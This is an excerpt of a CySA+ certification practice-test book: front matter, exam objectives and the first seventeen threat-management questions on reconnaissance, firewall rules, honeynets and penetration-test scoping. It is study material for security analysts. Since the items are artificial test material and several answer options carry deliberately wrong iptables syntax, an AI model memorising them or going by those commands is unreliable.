@@ -1,0 +1,2153 @@
+CompTIA®
+CySA+TM
+Practice Tests
+
+CompTIA®
+CySA+TM
+Practice Tests  
+Exam CS0-001
+Mike Chapple  
+David Seidl
+
+Senior Acquisitions Editor: Kenyon Brown
+Development Editor: Kelly TalbotTechnical Editors: Brent Hamilton and Warren E. WryostekProduction Manager: Kathleen Wisor Copy Editor: Kim WimpsettEditorial Manager: Mary Beth WakefieldExecutive Editor: Jim MinatelBook Designers: Judy Fung and Bill Gibson Proofreader: Nancy Carrasco Indexer: Johnna VanHoose DinseProject Coordinator, Cover: Brent SavageCover Designer: WileyCover Image: © Jeremy Woodhouse/Getty Images, Inc.
+Copyright © 2018 by John Wiley & Sons, Inc., Indianapolis, IndianaPublished simultaneously in CanadaISBN: 978-1-119-43320-0 
+ISBN: 978-1-119-43319-4 (ebk.)ISBN: 978-1-119-43318-7 (ebk.)
+Manufactured in the United States of AmericaNo part of this publication may be reproduced, stored in a retrieval system or transmitted in any form or 
+by any means, electronic, mechanical, photocopying, recording, scanning or otherwise, except as permit-ted under Sections 107 or 108 of the 1976 United States Copyright Act, without either the prior written permission of the Publisher, or authorization through payment of the appropriate per-copy fee to the Copyright Clearance Center, 222 Rosewood Drive, Danvers, MA 01923, (978) 750-8400, fax (978)  646-8600. Requests to the Publisher for permission should be addressed to the Permissions Department, John Wiley & Sons, Inc., 111 River Street, Hoboken, NJ 07030, (201) 748-6011, fax (201) 748-6008, or online at 
+http://www.wiley.com/go/permissions .
+Limit of Liability/Disclaimer of Warranty: The publisher and the author make no representations or war-ranties with respect to the accuracy or completeness of the contents of this work and specifically disclaim all warranties, including without limitation warranties of fitness for a particular purpose. No warranty may be created or extended by sales or promotional materials. The advice and strategies contained herein may not be suitable for every situation. This work is sold with the understanding that the publisher is not engaged in rendering legal, accounting, or other professional services. If professional assistance is required, the services of a competent professional person should be sought. Neither the publisher nor the author shall be liable for damages arising herefrom. The fact that an organization or Web site is referred to in this work as a citation and/or a potential source of further information does not mean that the author or the publisher endorses the information the organization or Web site may provide or recommendations it may make. Further, readers should be aware that Internet Web sites listed in this work may have changed or disappeared between when this work was written and when it is read.
+For general information on our other products and services or to obtain technical support, please contact 
+our Customer Care Department within the U.S. at (877) 762-2974, outside the U.S. at (317) 572-3993 or fax (317) 572-4002.
+Wiley publishes in a variety of print and electronic formats and by print-on-demand. Some material 
+included with standard print versions of this book may not be included in e-books or in print-on-demand. If this book refers to media such as a CD or DVD that is not included in the version you purchased, you may download this material at 
+http://booksupport.wiley.com . For more information about Wiley  
+products, visit www.wiley.com .
+Library of Congress Control Number: 2017962407
+TRADEMARKS: Wiley, the Wiley logo, and the Sybex logo are trademarks or registered trademarks of 
+John Wiley & Sons, Inc. and/or its affiliates, in the United States and other countries, and may not be used without written permission. CompTIA and CySA+ are trademarks or registered trademarks of CompTIA Properties, LLC. All other trademarks are the property of their respective owners. John Wiley & Sons, Inc. is not associated with any product or vendor mentioned in this book.
+10 9 8 7 6 5 4 3 2 1
+
+For Renee, the most patient and caring person I know. Thank you for being 
+the heart of our family. —MJC
+This book is dedicated to Addam, Matt, and Charles, my co-workers and 
+buddies early in my information security career. Thanks for being wonderful friends! —DAS
+
+Acknowledgments
+The authors would like to thank the many people who made this book possible. Kenyon 
+Brown at Wiley has been a wonderful partner through many books over the years. Carole Jelen, our agent, worked on a myriad of logistic details and handled the business side of the book with her usual grace and commitment to excellence. Warren Wyrostek, our technical editor, pointed out many opportunities to improve our work and deliver a high-quality final product. Kelly Talbot served as developmental editor and managed the project smoothly. Many other people we’ll never meet worked behind the scenes to make this book a success.
+
+About the Authors
+Mike Chapple, PhD, CISSP,   is an author of the best-selling CySA+ Study Guide and 
+CISSP (ISC)2 Certified Information Systems Security Professional Official Study Guide , 
+now in its eighth edition. He is an information security professional with two decades of 
+experience in higher education, the private sector, and government.
+Mike currently serves as an associate teaching professor of IT, analytics, and operations 
+at the University of Notre Dame, where he teaches courses focused on cybersecurity and business analytics.
+Before returning to Notre Dame, Mike served as executive vice president and chief infor-
+mation officer of the Brand Institute, a Miami-based marketing consultancy. Mike also spent four years in the information security research group at the National Security Agency and served as an active duty intelligence officer in the U.S. Air Force.
+He is a technical editor for Information Security Magazine  and has written 20 books, 
+including Cyberwarfare: Information Operations in a Connected World (Jones & Bartlett, 2015), CompTIA Security+ Training Kit (Microsoft Press, 2013), and CISSP Study Guide (Sybex, 2017).
+Mike earned both his BS and PhD degrees from Notre Dame in computer science and 
+engineering. He also holds an MS in computer science from the University of Idaho and an MBA from Auburn University.
+David Seidl
+  is the senior director for Campus Technology Services at the University of 
+Notre Dame and is responsible for central platform and operating system support, virtual-
+ization, database administration and services, identity and access management, application services, enterprise content and document management, lab and lectern computing, digital signage, and academic printing. Prior to his current role, he was Notre Dame’s director of information security.
+David has co-authored CompTIA CySA+ Study Guide: Exam CS0-001 (Sybex, 2017), 
+CISSP Official (ISC)
+2 Practice Tests (Sybex, 2016), CompTIA Security+ Training Kit 
+(Microsoft Press, 2013), and Cyberwarfare: Information Operations in a Connected World (Jones & Bartlett, 2015) with Mike Chapple, and he has served as the technical editor for the sixth and seventh editions of CISSP Study Guide (Sybex, seventh edition, 2015). David holds a bachelor’s degree in communication technology and a master’s degree in informa-tion security from Eastern Michigan University, as well as CISSP, CySA+, GPEN, and GCIH certifications.
+
+About the Technical Editor
+Warren E. Wyrostek, ED.D.,   is a solutions-oriented educator and leader, a certified  
+technical trainer and facilitator, an experienced DACUM enthusiast, and an innovative 
+certification and assessment expert in demand. Warren enjoys contributing to the fields of technical education/certification and assessment, leveraging his skills and experience in technical education, training and development, and certification to grow and develop innovative initiatives.
+Warren has earned a master’s degree in adult vocational-technical education from 
+Valdosta State College, a master’s in divinity from New York’s Union Theological Seminary, and a BA from Hunter College in chemistry/premedicine. Recently he com-pleted the ED.D., a doctorate in education, in curriculum and instruction at Valdosta State University.
+Warren has earned more than 50 IT certifications (including numerous security certifica-
+tions), has published three books, has served as the technical editor for more than 30 IT textbooks, and has authored more than 50 articles for major publishing houses. He is also the creator of the Master of Integrated Networking credential. Currently he is an adjunct, teaching research methods in interdisciplinary studies at VSU.
+Warren can be reached at 
+wyrostekw@msn.com .
+
+Contents at a Glance
+Introduction  xix
+Chapter 1 Domain 1: Threat Management  1
+Chapter 2 Domain 2: Vulnerability Management  63
+Chapter 3 Domain 3: Cyber Incident Response  139
+Chapter 4 Domain 4: Security Architecture and Tool Sets  193
+Chapter 5 Practice Exam 1  251
+Chapter 6 Practice Exam 2  277
+Appendix   Answers to Review Questions  307
+Index  419
+
+Contents
+Introduction  xix
+Chapter 1 Domain 1: Threat Management  1
+Chapter 2 Domain 2: Vulnerability Management  63
+Chapter 3 Domain 3: Cyber Incident Response  139
+Chapter 4 Domain 4: Security Architecture and Tool Sets  193
+Chapter 5 Practice Exam 1  251
+Chapter 6 Practice Exam 2  277
+Appendix   Answers to Review Questions  307
+Chapter 1: Domain 1: Threat Management  308
+Chapter 2: Domain 2: Vulnerability Management  330
+Chapter 3: Domain 3: Cyber Incident Response  353
+Chapter 4: Domain 4: Security Architecture and Tool Sets  377
+Chapter 5: Practice Exam 1  399
+Chapter 6: Practice Exam 2  408
+Index  419
+
+Introduction
+CompTIA CySA+ (Cybersecurity Analyst) Practice Tests is a companion volume to the 
+CompTIA CySA+ (Cybersecurity Analyst) Study Guide (Wiley, 2017, Chapple/Seidl). If you’re looking to test your knowledge before you take the CySA+ exam, this book will  help you by providing a combination of 1,000 questions that cover the CySA+ domains and easy-to-understand explanations of both right and wrong answers.
+If you’re just starting to prepare for the CySA+ exam, we highly recommend that you 
+use the Cybersecurity Analyst+ (CySA+) Study Guide to help you learn about each of  
+the domains covered by the CySA+ exam. Once you’re ready to test your knowledge, use this book to help find places where you may need to study more or to practice for the exam itself.
+Since this is a companion to the CySA+ Study Guide , this book is designed to be similar 
+to taking the CySA+ exam. It contains multipart scenarios as well as standard multiple-choice questions similar to those you may encounter in the certification exam itself.  The book itself is broken up into 6 chapters: 4 domain-centric chapters with more than 200 questions about each domain, and 2 chapters that contain 85-question practice tests to simulate taking the exam itself.
+CompTIA
+CompTIA is a nonprofit trade organization that offers certification in a variety of IT areas, ranging from the skills that a PC support technical needs, which are covered in the A+ exam, to advanced certifications like the CompTIA Advanced Security Practitioner (CASP) certification. CompTIA divides its exams into four different categories based on the skill level required for the exam and what topics it covers, as shown here:
+Foundational Professional Specialty Mastery
+IT Fundamentals A+
+Cloud+ with VirtualizationCySA+Linux+Mobility+Network+Security+Project+Server+CDIA+CTT+Cloud EssentialsHealthcare IT TechCASP
+
+xx Introduction
+CompTIA recommends that practitioners follow the cybersecurity career path shown 
+here:
+CompTIA
+IT
+FundamentalsCompTIA
+A+CompTIA
+Network+CompTIA
+Security+CompTIA
+CySA+CompTIA
+CASP
+As you can see, the Cybersecurity Analyst+ certification fits into the Professional 
+category, which is the same place you’ll find the popular A+, Network+, and Security+  
+credentials. Don’t let this fool you, however. The Cybersecurity Analyst+ exam is a more advanced exam, intended for professionals with hands-on experience and who possess the knowledge covered by the prior exams.
+CompTIA certifications are ISO and ANSI accredited, and they are used throughout 
+multiple industries as a measure of technical skill and knowledge. In addition, CompTIA certifications, including the Security+ and the CASP, have been approved by the U.S. government as information assurance baseline certifications and are included in the State Department’s Skills Incentive Program.
+The Cybersecurity Analyst+ Exam
+The Cybersecurity Analyst+ exam, which CompTIA refers to as the CySA+, is designed to be a vendor-neutral certification for cybersecurity, threat, and vulnerability analysts. The CySA+ certification is designed for security analysts and engineers as well as security opera-tions center (SOC) staff, vulnerability analysts, and threat intelligence analysts. It focuses 
+
+Introduction  xxi
+on security analytics and practical use of security tools in real-world scenarios. It covers 
+four major domains: Threat Management, Vulnerability Management, Cyber Incident Response, and Security Architecture and Tool Sets. These four areas include a range of topics, from reconnaissance to incident response and forensics, while focusing heavily on scenario-based learning.
+The CySA+ exam fits between the entry-level Security+ exam and the CompTIA 
+Advanced Security Practitioner (CASP) certification, providing a mid-career certification for those who are seeking the next step in their certification and career path.
+The CySA+ exam is conducted in a format that CompTIA calls “performance-based 
+assessment.” This means the exam uses hands-on simulations using actual security tools and scenarios to perform tasks that match those found in the daily work of a security prac-titioner. Exam questions may include multiple types of questions such as multiple-choice, fill-in-the-blank, multiple-response, drag-and-drop, and image-based problems.
+CompTIA recommends that test takers have three to four years of information  
+security–related experience before taking this exam. The exam costs $320 in the United States, with roughly equivalent prices in other locations around the globe. You can find more details about the CySA+ exam and how to take it at 
+https://certification 
+.comptia.org/certifications/cybersecurity-analyst .
+Study and Exam Preparation Tips
+We recommend you use this book in conjunction with the Cybersecurity Analyst+ (CySA+) Study Guide.  Read through chapters in the study guide and then try your hand at the prac-
+tice questions associated with each domain in this book.
+You should also keep in mind that the CySA+ certification is designed to test practical 
+experience, so you should also make sure that you get some hands-on time with the secu-rity tools covered on the exam. CompTIA recommends the use of NetWars-style simula-tions, penetration testing and defensive cybersecurity simulations, and incident response training to prepare for the CySA+.
+Additional resources for hands-on exercises include the following:
+ ■Exploit-Exercises.com provides virtual machines, documentation, and challenges covering a wide range of security issues at 
+https://exploit-exercises.com/ .
+ ■Hacking-Lab provides Capture the Flag (CTF) exercises in a variety of fields at 
+https://www.hacking-lab.com/index.html .
+ ■The OWASP Hacking Lab provides excellent web application focused exercises at 
+https://www.owasp.org/index.php/OWASP_Hacking_Lab .
+ ■PentesterLab provides a subscription based access to penetration testing exercises at 
+https://www.pentesterlab.com/exercises/ .
+ ■The InfoSec Institute provides online capture-the-flag activities with bounties for written explanations of successful hacks at 
+http://ctf.infosecinstitute.com/ .
+
+xxii Introduction
+Since the exam uses scenario-based learning, expect the questions to involve analysis 
+and thought, rather than relying on simple memorization. The questions in this book are 
+intended to help you be confident that you know the topic well enough to think through hands-on exercises.
+Taking the Exam
+Once you are fully prepared to take the exam, you can visit the CompTIA website to pur-chase your exam voucher:
+www.comptiastore.com/Articles.asp?ID=265&category=vouchers
+CompTIA partners with Pearson VUE’s testing centers, so your next step will be to 
+locate a testing center near you. In the United States, you can do this based on your address or your ZIP code, while non-U.S. test takers may find it easier to enter their city and coun-try. You can search for a test center near you at the Pearson Vue website, where you will need to navigate to “Find a test center”:
+www.pearsonvue.com/comptia/
+Now that you know where you’d like to take the exam, simply set up a Pearson VUE 
+testing account and schedule an exam:
+https://certification.comptia.org/testing/schedule-exam
+On the day of the test, bring two forms of identification, and make sure to show up 
+with plenty of time before the exam starts. Remember that you will not be able to take your notes, electronic devices (including smartphones and watches), or other materials in with you.
+After the Cybersecurity Analyst+ Exam
+Once you have taken the exam, you will be notified of your score immediately, so you’ll know if you passed the test right away. You should keep track of your score report with your exam registration records and the email address you used to register for the exam.
+Maintaining Your Certification
+CompTIA certifications must be renewed on a periodic basis. To renew your certification, you can either pass the most current version of the exam, earn a qualifying higher-level 
+
+Introduction  xxiii
+CompTIA or industry certification, or complete sufficient continuing education activities to 
+earn enough continuing education units (CEUs) to renew it.
+CompTIA provides information on renewals via their website at:
+https://certification.comptia.org/continuing-education/how-to-renew
+When you sign up to renew your certification, you will be asked to agree to the CE pro-
+gram’s Code of Ethics, to pay a renewal fee, and to submit the materials required for your chosen renewal method.
+You can find a full list of the industry certifications you can use to acquire CEUs toward 
+renewing the CySA+:
+https://certification.comptia.org/continuing-education/renewothers/ 
+renewing-cysa
+Using This Book to Practice
+This book is composed of six chapters. Each of the first four chapters covers a domain, 
+with a variety of questions that can help you test your knowledge of real-world, scenario, and best practices–based security knowledge. The final two chapters are complete practice exams that can serve as timed practice tests to help determine whether you’re ready for the CySA+ exam.
+We recommend taking the first practice exam to help identify where you may need to 
+spend more study time and then using the domain-specific chapters to test your domain knowledge where it is weak. Once you’re ready, take the second practice exam to make sure you’ve covered all the material and are ready to attempt the CySA+ exam.
+As you work through questions in this book, you will encounter tools and technology 
+that you may not be familiar with. If you find that you are facing a consistent gap or that a domain is particularly challenging, we recommend spending some time with books and materials that tackle that domain in depth. This can help you fill in gaps and help you be more prepared for the exam.
+
+xxiv Introduction
+Objectives Map for CompTIA CySA+ 
+(Cybersecurity Analyst) Exam CS0-001
+The following objective map for the CompTIA CySA+ (Cybersecurity Analyst) certification 
+exam will enable you to find where each objective is covered in the book.
+Objectives Map
+Objective Chapter
+1.0 Threat Management
+1.1 Given a scenario, apply environmental reconnaissance techniques using 
+appropriate tools and processes.Chapter 1
+Procedures/common tasks including Topology discovery, OS fingerprinting, Service discovery, Packet capture, Log review, Router/firewall ACLs review, Email harvesting, Social media profiling, Social engineering, DNS harvesting, Phishing; Variables including Wireless vs. wired, virtual vs. physical, internal vs. external, and on-premises vs. cloud; Tools including NMAP, Host scanning, Network mapping, netstat, packet analyzers, IDS/IPS, HIDS/NIDS, Firewall  rule-based and logs, Syslog, Vulnerability scanners
+1.2 Given a scenario, analyze the results of a network reconnaissance. Chapter 1
+Point-in-time data analysis including Packet analysis, Protocol analysis, Traffic 
+analysis, Netflow analysis, Wireless analysis; Data correlation and analytics including Anomaly analysis, Trend analysis, Availability analysis, Heuristic analysis, Behavioral analysis; Data output including Firewall logs, Packet captures, NMAP scan results, Event logs, Syslogs, IDS reports; Tools including SIEM, Packet analyzers, IDS/IPS, Resource monitoring tools, Netflow analyzer
+1.3 Given a network-based threat, implement or recommend the appropriate 
+response and countermeasure.Chapter 1
+Network segmentation, system isolation, jump boxes and bastion hosts, Honeypots and honeynets, Endpoint security, Group policies, ACLs, Sinkholes, Hardening, Mandatory Access Control (MAC), Compensating controls, Blocking unused ports/services, Patching, Network Access Control (NAC) policies including time-based, rule-based, role-based, and location-based
+
+Introduction  xxv
+Objective Chapter
+1.4 Explain the purpose of practices used to secure a corporate environment. Chapter 1
+Penetration testing, Rules of engagement: timing, scope. Authorization, 
+exploitation, communication, and reporting. Reverse engineering, Isolation/sandboxing, Hardware concerns including source authenticity of hardware, trusted foundry, and OEM documentation. Software/malware, Fingerprinting/hashing, Decomposition, Training and exercises, Red teams, Blue teams, and White teams. Risk evaluation, Technical control review, Operational control review, Technical impact and likelihood and rating: High, Medium, and Low
+2.0 Vulnerability Management
+2.1 Given a scenario, implement an information security vulnerability 
+management process.Chapter 2
+Identification of requirements, Regulatory environments, Corporate policy, Data classification, Asset inventory including critical and non-critical assets. Establishing scanning frequency based on risk appetite, regulatory requirements, technical constraints, and workflow. Configure tools to perform scans according to specification, Determining scanning criteria, setting sensitivity levels, vulnerability feeds, scan scope, credentialed vs. non-credentialed, types of data, and server-based vs. agent-based scanning. Tool updates/plug-ins, SCAP, Permissions and access, How to execute scanning and generate reports, Automated vs. manual distribution, remediation, prioritizing response based on criticality and difficulty of implementation. Communication/change control, Sandboxing/testing, Inhibitors to remediation: MOUs, SLAs, organizational governance, business process interruption, and degrading functionality. Ongoing scanning and continuous monitoring
+2.2 Given a scenario, analyze the output resulting from a vulnerability scan. Chapter 2
+Analyze reports from a vulnerability scan, Review and interpret scan results, 
+Identify false positives, Identify exceptions, Prioritize response actions, Validate results and correlate other data points, Compare to best practices or compliance, Reconcile results, Review related logs and/or other data sources, Determine trends
+2.3 Compare and contrast common vulnerabilities found in the following 
+targets within an organization.Chapter 2
+Servers, Endpoints, Network infrastructure, Network appliances, Virtual infrastructure, Virtual hosts, Virtual networks, Management interfaces, Mobile devices, Interconnected networks, Virtual private networks (VPNs), Industrial Control Systems (ICSs), SCADA devices
+
+xxvi Introduction
+Objective Chapter
+3.0 Cyber Incident Response
+3.1 Given a scenario, distinguish threat data or behavior to determine the 
+impact of an incidentChapter 3
+Threat classification: known threats vs. unknown threats, Zero day, and advanced persistent threats. Factors contributing to incident severity and prioritization: scope of impact, downtime, recovery time. data integrity, economic impact, system process criticality. Types of data: Personally Identifiable Information (PII), Personal Health Information (PHI), payment card information, intellectual property, corporate confidential, accounting data. mergers and acquisitions
+3.2 Given a scenario, prepare a toolkit and use appropriate forensics tools 
+during an investigation.Chapter 3
+Forensics kits, Digital forensics workstations, Write blockers, Cables, Drive adapters, Wiped removable media, Cameras, o Crime tape, Tamper-proof seals, Documentation/forms, Chain of custody forms, Incident response plan, Incident forms, Call list/escalation lists. Forensic investigation suites, Imaging utilities, Analysis utilities, Chain of custody, Hashing utilities, OS and process analysis, Mobile device forensics, Password crackers, Cryptography tools, Log viewers
+3.3 Explain the importance of communication during the incident response 
+process.Chapter 3
+Stakeholders: HR, legal, marketing, and management. Purpose of communication processes: Limiting communication to trusted parties, disclosure based on regulatory/legislative requirements, o Preventing inadvertent release of information, secure method of communication. Role-based responsibilities: technical, management, law enforcement, and retaining an incident response provider
+3.4 Given a scenario, analyze common symptoms to select the best course of 
+action to support incident response.Chapter 3
+Common network-related symptoms: bandwidth consumption, beaconing, irregular peer-to-peer communication, rogue devices on the network, scan sweeps, and unusual traffic spikes. Common host-related symptoms: processor (CPU) consumption, memory consumption, drive capacity consumption, unauthorized software, malicious processes, unauthorized changes, unauthorized privileges, data exfiltration. Common application-related symptoms: anomalous activity, introduction of new accounts, unexpected output, unexpected outbound communication, service interruption, memory overflows
+
+Introduction  xxvii
+Objective Chapter
+3.5 Summarize the incident recovery and post-incident response process. Chapter 3
+Containment techniques: segmentation, isolation, removal, and reverse 
+engineering. Eradication techniques: sanitization, reconstruction/reimage, secure disposal, validation, patching, permissions, scanning, and verifying logging/communication to security monitoring. Corrective actions, Lessons learned reports, Change control process, Updating incident response plans, Incident summary reports
+4.0 Security Architecture and Tool Sets
+4.1 Explain the relationship between frameworks, common policies, controls, 
+and procedures.Chapter 4
+Regulatory compliance, Frameworks: NIST, ISO, COBIT, SABSA, TOGAF, ITIL. Policies: password policy, acceptable use policy, data ownership policy, data retention policy, account management policy, and data classification policies. Controls, Control selection based on criteria, Organizationally defined parameters, Physical controls, Logical controls, Administrative controls, Procedures: continuous monitoring, evidence production, patching, compensating control development, control testing procedures, managing exceptions, developing and executing remediation plans. Verifications and quality control, Audits, Evaluations, Assessments, Maturity models, Certification
+4.2 Given a scenario, use data to recommend remediation of security issues 
+related to identity and access management.Chapter 4
+Security issues associated with context-based authentication based on time, location, frequency, behavioral patterns. Security issues associated with identities: personnel, endpoints, servers, services, roles, applications. Security issues associated with identity repositories, Directory services, TACACS+, RADIUS, Security issues associated with federation and single sign-on: o Manual vs. automatic provisioning/deprovisioning and self-service password reset. Exploits: impersonation, man-in-the-middle attacks, session hijacking, cross-site scripting, privilege escalation, and rootkits.
+4.3 Given a scenario, review security architecture and make recommendations 
+to implement compensating controls.Chapter 4
+Security data analytics using data aggregation and correlation, trend analysis, and historical analysis. Manual review of firewall logs, syslogs, authentication logs, and event logs. Defense in depth concepts. Personnel security: training, dual control, separation of duties, third party/consultants, cross training, mandatory vacation, succession planning. Defense in depth related processes: continual improvement, scheduled reviews, and retirement of processes. Technologies: automated reporting, security appliances. security suites, outsourcing, Security as a Service (SaaS), and cryptography. Other security concepts: network design and network segmentation
+
+xxviii Introduction
+Objective Chapter
+4.4 Given a scenario, use application security best practices while participating 
+in the Software Development Life Cycle (SDLC).Chapter 4
+Best practices during software development, Security requirements definition, Security testing phases, Static code analysis, Web app vulnerability scanning, Fuzzing, Use of interception proxies to crawl applications, Manual peer reviews, User acceptance testing, Stress testing applications, Security regression testing, Input validation, Secure coding best practices from OWASP, SANS, Center for Internet Security. System design recommendations and benchmarks
+4.5 Compare and contrast the general purpose and reasons for using various 
+cybersecurity tools and technologies.Chapter 4
+Preventative tools, including IPS: Sourcefire, Snort, Bro, HIPS, Firewalls: Cisco, Palo Alto, Check Point. Antivirus and Anti-malware, EMET, Web proxies, Web Application Firewall (WAF) systems: ModSecurity, NAXSI, Imperva.
+Collective tools, including SIEMs: ArcSight, QRadar, Splunk, AlienVault, OSSIM, 
+Kiwi Syslog. Network scanning tool with NMAP, Vulnerability scanning using Qualys, Nessus, OpenVAS, Nexpose, Nikto, and the Microsoft Baseline Security Analyzer. o Packet capture using Wireshark, tcpdump, Network General, and Aircrack-ng. Command line/IP utilities: netstat, ping, tracert/traceroute, ipconfig/ifconfig, nslookup/dig, the Sysinternals suite, OpenSSL. IDS/HIDS: Bro.
+Analytical tools, including Vulnerability scanning including Qualys, Nessus, 
+OpenVAS, Nexpose, Nikto, and the Microsoft Baseline Security Analyzer. Monitoring tools: MRTG, Nagios, SolarWinds, Cacti, NetFlow Analyzer. Interception proxies: Burp Suite, Zap, and Vega.
+Exploit tools, including Interception proxies: Burp Suite, Zap, and Vega. o 
+Exploit framework: Metasploit and Nexpose. Fuzzers: Untidy, Peach Fuzzer, Microsoft SDL File/Regex Fuzzer.
+Forensics tools, including Forensic suites: EnCase, FTK, Helix, Sysinternals, and 
+Cellebrite. Hashing tools: MD5sum, SHAsum. Password cracking tools; John the Ripper, Cain & Abel. Imaging using DD
+
+CompTIA®
+CySA+TM
+Practice Tests
+
+Domain 1: Threat 
+Management
+ExaM obj EcTivEs cov ErED in This 
+chap TEr:
+ ✓1.1 Given a scenario, apply environmental reconnais-
+sance techniques using appropriate tools and processes.
+ ■Procedures/common tasks
+ ■Variables
+ ■Tools
+ ✓1.2 Given a scenario, analyze the results of a network 
+reconnaissance.
+ ■Point-in-time data analysis
+ ■Data correlation and analytics
+ ■Data output
+ ■Tools
+ ✓1.3 Given a network-based threat, implement or recom-
+mend the appropriate response and countermeasure.
+ ■Network segmentation
+ ■Honeypot
+ ■Endpoint security
+ ■Group policies
+ ■ACLs
+ ■Hardening
+ ■Network Access Control (NAC)
+ ✓1.4 Explain the purpose of practices used to secure a  
+corporate environment.
+ ■Penetration testing
+ ■Reverse engineering
+ ■Training and exercises
+ ■Risk evaluationChapter 
+1
+
+2 Chapter 1  ■ Domain 1: Threat Management
+1. Charles wants to use active discovery techniques as part of his reconnaissance efforts. 
+Which of the following techniques fits his criteria?
+A. Google searching
+B. Using a Shodan search
+C. Using DNS reverse lookup
+D. Querying a PGP key server
+2. During the reconnaissance stage of a penetration test, Cynthia needs to gather information 
+about the target organization’s network infrastructure without causing an IPS to alert the target to her information gathering. Which of the following is her best option?
+A.
+ Perform a DNS brute-force attack.
+B. Use an nmap ping  sweep.
+C. Perform a DNS zone transfer.
+D. Use an nmap  stealth scan.
+3. Tiffany needs to assess the patch level of a Windows 2012 server and wants to use a freely 
+available tool to check the system for security issues. Which of the following tools will provide the most detail about specific patches installed or missing from her machine?
+A.
+ nmap
+B. Nessus
+C. MBSA
+D. Metasploit
+4. Charleen is preparing to conduct a scheduled reconnaissance effort against a client site. 
+Which of the following is not typically part of the rules of engagement that are agreed to with a client for a reconnaissance effort?
+A.
+ Timing
+B. Scope
+C. Exploitation methods
+D. Authorization
+5. A port scan of a remote system shows that port 3306 is open on a remote database server. 
+What database is the server most likely running?
+A. Oracle
+B. Postgres
+C. MySQL
+D. Microsoft SQL
+6. Maria wants to deploy an anti-malware tool to detect zero-day malware. What type of 
+detection method should she look for in her selected tool?
+A. Signature based
+B. Heuristic based
+
+Chapter 1  ■ Domain 1: Threat Management  3
+C. Trend based
+D. Availability based
+7. During a port scan of her network, Cynthia discovers a workstation that shows the follow-
+ing ports open. What should her next action be?
+A. Determine the reason for the ports being open.
+B. Investigate the potentially compromised workstation.
+C. Run a vulnerability scan to identify vulnerable services.
+D. Reenable the workstation’s local host firewall.
+8. Charles wants to provide additional security for his web application that currently stores passwords in plain text in a database. Which of the following options is his best option to prevent theft of the database from resulting in exposed passwords?
+A.
+ Encrypt the database of plain-text passwords.
+B. Use MD5 and a salt.
+C. Use SHA-1 and a salt.
+D. Use bcrypt.
+9. Cameron needs to set up a Linux iptables -based firewall ruleset to prevent access from 
+hosts A and B, while allowing SMTP traffic from host C. Which set of the following  
+commands will accomplish this?
+Host A
+IP Address:
+10.1.1.170
+Host B
+IP Address:
+10.2.0.134
+Destination
+HostIP Address:192.168.2.11
+Host C
+IP Address:
+10.2.0.130
+
+4 Chapter 1  ■ Domain 1: Threat Management
+A. # iptables -I INPUT 2 -s 10.1.1.170 -j DROP  
+# iptables -I INPUT 2 -s 10.2.0.0/24 --dport 25 -j DROP  
+# iptables -I INPUT 2 -s 10.2.0.130 --dport 25 -j ALLOW
+B. # iptables -I INPUT 2 -s 10.1.1.170 -j DROP  
+# iptables -I INPUT 2 -s 10.2.0.0.134 -j DROP  
+# iptables -I INPUT 2 -s 10.2.0.130 --dport 25 -j ALLOW
+C. # iptables -I INPUT 2 -s 10.1.1.170 -j ALLOW  
+# iptables -I INPUT 2 -s 10.2.0.0.134 -j ALLOW  
+# iptables -I INPUT 2 -s 10.2.0.130 --dport 25 -j DROP
+D. # iptables -I INPUT 2 -s 10.1.1.170 -j DROP  
+# iptables -I INPUT 2 -s 10.2.0.0.134 -j DROP  
+# iptables -I INPUT 2 -s 10.2.0.130 -j ALLOW
+10. After filling out the scoping document for a penetration test, including details of what 
+tools, techniques, and targets are included in the test, what is the next step that Jessica needs to take to conduct the test?
+A.
+ Port scan the target systems.
+B. Get sign-off on the document.
+C. Begin passive fingerprinting.
+D. Notify local law enforcement.
+11. Brian’s penetration testing efforts have resulted in him successfully gaining access to a 
+target system. Using the diagram shown here, identify what step occurs at point B in the NIST SP800-115 process flow.
+Gaining Access BSystem
+BrowsingInstall
+Additional Tools
+A. Vulnerability scanning
+B. Discovery
+C. Escalating privileges
+D. Pivoting
+12. Chris wants to prevent remote login attacks against the root account on a Linux system. What method will stop attacks like this while allowing normal users to use ssh?
+A.
+ Add an iptables  rule blocking root logins.
+B. Add root to the sudoers group.
+
+Chapter 1  ■ Domain 1: Threat Management  5
+C. Change sshd_config  to deny root login.
+D. Add a network IPS rule to block root logins.
+13. What term is often used for attackers during a penetration test?
+A. Black team
+B. Blue team
+C. Red team
+D. Green team
+14. Charles uses the following command while investigating a Windows workstation used by 
+his organization’s vice president of finance who only works during normal business hours. Charles believes that the workstation has been used without permission by members of his organization’s cleaning staff after-hours. What does he know if the user ID shown is the only user ID able to log into the system, and he is investigating on August 12, 2017?
+C:\Users\bigfish>wmic netlogin get name,lastlogon,badpasswordcount
+BadPasswordCount                LastLogon                    NameNT AUTHORITY\SYSTEM 0            20170811203748.000000-240     Finance\bigfish
+A. The account has been compromised.
+B. No logins have occurred.
+C. The last login was during business hours.
+D. Charles cannot make any determinations from this information.
+15. Lauren’s honeynet, shown here, is configured to use a segment of unused network space 
+that has no legitimate servers in it. What type of threats is this design particularly useful for detecting?
+Internal
+Trusted
+ZoneInternet
+Firewall or
+Uniﬁed
+Security
+Device
+HoneynetBorder Router
+
+6 Chapter 1  ■ Domain 1: Threat Management
+A. Zero-day attacks
+B. SQL injection
+C. Network scans
+D. DDoS attacks
+16. Angela is designing her organization’s data center network and wants to establish a secure 
+zone and a DMZ. If Angela wants to ensure that user accounts and traffic that manage systems in the DMZ are easily auditable and that all access can be logged while helping prevent negative impacts from compromised or infected workstations, which of the follow-ing solutions is Angela’s best design option?
+A.
+ Administrative virtual machines run on administrator workstations
+B. A jump host
+C. A bastion host
+D. Use ssh or RDP from administrative workstations
+17. Fred believes that the malware he is tracking uses a fast flux DNS network, which associ-
+ates many IP addresses with a single fully qualified domain name as well as using multiple download hosts. How many distinct hosts should he review based on the netflow shown here?
+Date flow start   Duration     Proto    Src      IP Addr:Port  Dst IP Addr:Port      Packets   Bytes   Flows 
